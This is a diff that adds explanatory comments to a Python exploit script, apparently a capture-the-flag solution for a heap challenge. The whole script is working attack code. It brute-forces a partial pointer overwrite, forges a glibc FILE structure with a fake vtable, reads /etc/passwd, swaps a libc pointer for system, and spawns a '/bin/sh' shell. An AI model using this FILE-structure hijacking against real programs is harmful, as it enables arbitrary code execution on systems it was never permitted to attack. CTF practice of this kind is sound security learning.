@@ -53,7 +53,7 @@ for i in range(0, 0x100):
 		data += p64(0x231)
 		data += p64(0xfbad2488)
 
-		read_a(0, len(data)+1, data+"\x98")
+		read_a(0, len(data)+1, data+"\x98") # partial overwrite, brute-force 1/16 for null-byte
 		read_l(1, 1)
 
 		write(1)
@@ -70,7 +70,7 @@ for i in range(0, 0x100):
 			r.sendline("9")
 			close_l(1)
 			alloc("/etc/passwd")
-			read_a(0, len(data)+1, data[1:] + p8(0x98+i))
+			read_a(0, len(data)+1, data[1:] + p8(0x98+i)) # partial overwrite
 			read_l(1, 1)
 			write(1)
 			r.recvuntil("content of")
@@ -129,10 +129,10 @@ for i in range(0, 0x100):
 
 		payload = "A"*23 + p64(0x231)
 		payload += p64(0x20646d65fbad3c80)
-		payload += p64(heap+0x1f8-0xa0)*5
-		payload += p64(heap+0x235)
-		payload += p64(heap+0x1f8-0xa0)
-		payload += p64(heap+0x235)
+		payload += p64(heap+0x1f8-0xa0)*5 # _IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr
+		payload += p64(heap+0x235) # _IO_write_end, no NULL Byte if _IO_write_end setted.
+		payload += p64(heap+0x1f8-0xa0) # _IO_buf_base
+		payload += p64(heap+0x235) # _IO_buf_end
 
 		read_a(1, len(payload)+1, payload)
 
@@ -141,21 +141,21 @@ for i in range(0, 0x100):
 
                 fake = "/bin/sh\x00"
                 fake += "\x00"*0x98
+		fake += p64(heap+0x1f8) # [buf+0xa0]
 		fake += p64(heap+0x1f8)
-		fake += p64(heap+0x1f8)
-		fake += p64(0x0)*2
-		fake += p64(0x1)*2
-                fake += p64(heap+0x158)
-                fake += p64(vtable)[:5]
+		fake += p64(0x0)*2 # [[buf+0xa0]+0x18]
+		fake += p64(0x1)*2 # [[buf+0xa0]+0x20] to bypass _IO_flush_all_lockp condition
+                fake += p64(heap+0x158) # this is for argument, it points &"/bin/sh" in heap
+                fake += p64(vtable)[:5] # changed vtable, sub_748E0
 
-		read_a(2, len(fake)-1, fake[:-1])
-		read_a(2, len(fake), fake)
+		read_a(2, len(fake)-1, fake[:-1]) # attempt 1
+		read_a(2, len(fake), fake) # have to try two attempt for no NULL-Byte added
 
 		### stage-2 ###
 
 		payload = "A"*23 + p64(0x231)
                 payload += p64(0x20646d65fbad3c80)
-                payload += p64(heap+0x240)*5
+                payload += p64(heap+0x240)*5 # to overwrite second libc ptr
                 payload += p64(heap+0x245)
                 payload += p64(heap+0x240)
                 payload += p64(heap+0x245)
@@ -163,9 +163,9 @@ for i in range(0, 0x100):
 		read_a(1, len(payload)+1, payload)
 
 		read_a(2, 4, "AAAA")
-                read_a(2, 5, p64(system)[:5])
+                read_a(2, 5, p64(system)[:5]) # change second libc ptr to system
 
-		###
+		### final stage ### 
 
 		payload = "A"*23 + p64(0x231)
 		payload += "\x80\x3c\xad\xfb\x3b\x73\x68\x00"
@@ -174,11 +174,11 @@ for i in range(0, 0x100):
                 payload += p64(heap+0x240)
                 payload += p64(heap+0x245)
 		payload += p64(0x0)*4
-		payload += p64(heap+0x1f8-0xa0)
+		payload += p64(heap+0x1f8-0xa0) # overwrite next ptr, it points fake stream pointer
 
-		read_a(1, len(payload)+1, payload)
+		read_a(1, len(payload)+1, payload) # go!
 
-		close_l(2)
+		close_l(2) # call vtable and get shell
 
 		r.interactive()
 	except Exception as e:
